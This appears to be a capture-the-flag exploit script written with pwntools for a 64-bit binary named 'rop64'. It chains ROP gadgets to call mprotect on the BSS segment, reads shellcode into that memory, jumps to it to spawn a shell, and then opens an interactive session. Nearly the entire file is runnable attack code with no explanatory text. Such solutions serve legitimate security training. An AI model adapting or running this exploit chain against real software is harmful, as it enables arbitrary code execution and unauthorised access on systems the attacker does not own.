#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln
from pwn import *

# /problems/rop64_4_a266556e68202c0c42d6c14f6c7102b3
exe = context.binary = ELF('./vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
#break *0x{exe.symbols.main:x}
b *0x400b6e 
b *0x449135 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


def syscall(rax, rdi, rsi, rdx):
  pl = ""
  pl += p64(GAD_POP_RAX)
  pl += p64(rax)

  pl += p64(GAD_POP_RDI)
  pl += p64(rdi)

  pl += p64(GAD_POP_RSI_RDX)
  pl += p64(rdx)
  pl += p64(rsi)

  pl += p64(GAD_SYSCALL)
  return pl

shellcode = asm(shellcraft.sh())

io = start()
io.recvuntil("out of this?")

GAD_SUB_RAX_RDX = 0x446b93 #: sub rax, rdx; ret;

GAD_POP_RAX = 0x4156f4     #: pop rax; ret;
GAD_POP_RDI = 0x400686     #: pop rdi; ret;
GAD_POP_RSI = 0x4100d3     #: pop rsi; ret;
GAD_POP_RDX = 0x44bf16     #: pop rdx; ret;
GAD_POP_R10 = 0x44bf15     #: pop r10; ret;
GAD_POP_RSI_RDX = 0x44bf39 #: pop rdx; pop rsi; ret;
GAD_SYSCALL = 0x449135     #: syscall; ret;


payload = ""
payload += "A"*16
payload += p64(0x6bc800) #BSS

payload += p64(GAD_POP_RAX)
payload += p64(11)

payload += p64(GAD_POP_RDX)
payload += p64(1)
payload += p64(GAD_SUB_RAX_RDX)

payload += p64(GAD_POP_RDI)
payload += p64(0x6bc000)

payload += p64(GAD_POP_RSI_RDX)
payload += p64(7)
payload += p64(0x1000)

payload += p64(GAD_SYSCALL)

payload += syscall(0, 0, 0x6bc500, len(shellcode))
payload += p64(0x6bc500)
 
io.sendline(payload)

sleep(2)
payload = shellcode
payload += "\x00"*800
io.sendline(shellcode)

# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

